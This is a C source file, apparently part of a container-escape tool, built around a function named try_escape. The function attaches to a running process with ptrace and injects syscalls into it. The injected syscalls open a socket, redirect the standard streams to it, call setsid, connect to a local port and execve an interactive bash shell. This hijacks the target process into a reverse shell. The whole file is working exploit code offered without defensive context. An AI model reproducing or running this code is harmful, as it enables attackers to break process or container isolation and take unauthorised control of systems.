#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <asm/unistd.h>
#include <netinet/in.h>

#include <sys/ptrace.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/reg.h>

#include "common.h"

#define align(x)({x += 7; x &= -8;})

void ptrace_read(pid_t pid, void *data, int len, long addr){
    int i;

    for(i=0; i<len; i+=8){
        *(long *)(data+i) = ptrace(PTRACE_PEEKTEXT, pid, addr+i, 0);
    }

}

void ptrace_write(pid_t pid, const void *data, int len, long addr){
    int i;

    for(i=0; i<len; i+=8){
        ptrace(PTRACE_POKETEXT, pid, addr+i, *(long *)(data+i));
    }
}

int try_escape(pid_t pid, int port){
    struct user_regs_struct regs, old_regs;
    struct sockaddr_in addr;
    long old_instruction;
    int status, i, fd, ret = 0;
    char *backup = NULL;

    info("attaching pid %d ...\n", pid);
    if(ptrace(PTRACE_ATTACH, pid, 0, 0) == -1){
        bad("can't attach %d: %s\n", pid, strerror(errno));
        return 0;
    }
    waitpid(pid, &status, 0);

    ptrace(PTRACE_GETREGS, pid, NULL, &regs);
    memcpy(&old_regs, &regs, sizeof(struct user_regs_struct));

    old_instruction = ptrace(PTRACE_PEEKTEXT, pid, regs.rip, 0);
    ptrace(PTRACE_POKETEXT, pid, regs.rip, 0xcc050f);

    /* open socket */
    regs.rax = __NR_socket;
    regs.rdi = AF_INET;
    regs.rsi = SOCK_STREAM;
    regs.rdx = 0;

    ptrace(PTRACE_SETREGS, pid, NULL, &regs);

    ptrace(PTRACE_CONT, pid, 0, 0);
    waitpid(pid, &status, 0);

    fd = ptrace(PTRACE_PEEKUSER, pid, 8*RAX, NULL);
    info("sys_socket = %d\n", fd);

    if(fd < 0){
        bad("sys_socket failed: %s\n", strerror(-fd));
        goto restore;
    }

    /* dup2 */
    regs.rax = __NR_dup2;
    regs.rdi = fd;

    for(i=0; i<3; i++){
        regs.rsi = i;
        ptrace(PTRACE_SETREGS, pid, NULL, &regs);

        ptrace(PTRACE_CONT, pid, 0, 0);
        waitpid(pid, &status, 0);

        int res = ptrace(PTRACE_PEEKUSER, pid, 8*RAX, NULL);
        info("sys_dup2 = %d\n", res);

        if(res < 0){
            bad("sys_dup2 failed: %s\n", strerror(-res));
            goto restore;
        }
    }

    /* setsid ~black magic o.o for fuck SIGTTIN~ */
    regs.rax = __NR_setsid;
    ptrace(PTRACE_SETREGS, pid, NULL, &regs);

    ptrace(PTRACE_CONT, pid, 0, 0);
    waitpid(pid, &status, 0);


    /* connect */

    int len = sizeof(addr);
    addr.sin_addr.s_addr = 0x0100007f;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    align(len);
    backup = malloc(len);

    ptrace_read(pid, backup, len, regs.rsp);
    ptrace_write(pid, &addr, len, regs.rsp);

    regs.rax = __NR_connect;
    regs.rdi = fd;
    regs.rsi = regs.rsp;
    regs.rdx = sizeof(addr);

    ptrace(PTRACE_SETREGS, pid, NULL, &regs);

    ptrace(PTRACE_CONT, pid, 0, 0);
    waitpid(pid, &status, 0);

    int res = ptrace(PTRACE_PEEKUSER, pid, 8*RAX, NULL);
    info("sys_connect = %d\n", res);

    if(res < 0){
        ptrace_write(pid, backup, len, regs.rsp);
        bad("sys_connect failed: %s\n", strerror(-res));
        goto restore;
    }

    /* execve */

    ptrace_write(pid, "/bin/bash\x00-i", 16, regs.rsp);
    ptrace_write(pid, (char *[]){ (char *)regs.rsp, (char *)regs.rsp+10, NULL }, 24, regs.rsp+13);

    regs.rax = __NR_execve;
    regs.rdi = regs.rsp;
    regs.rsi = regs.rsp+13;
    regs.rdx = 0;

    ptrace(PTRACE_SETREGS, pid, NULL, &regs);
    ptrace(PTRACE_CONT, pid, 0, 0);
    waitpid(pid, &status, 0);

    ret = 1;

    restore:
    free(backup);
	if(!ret){
	    ptrace(PTRACE_SETREGS, pid, NULL, &old_regs);
	    ptrace(PTRACE_POKETEXT, pid, old_regs.rip, old_instruction);
	}

    ptrace(PTRACE_DETACH, pid, 0, SIGCONT);

    return ret;

}
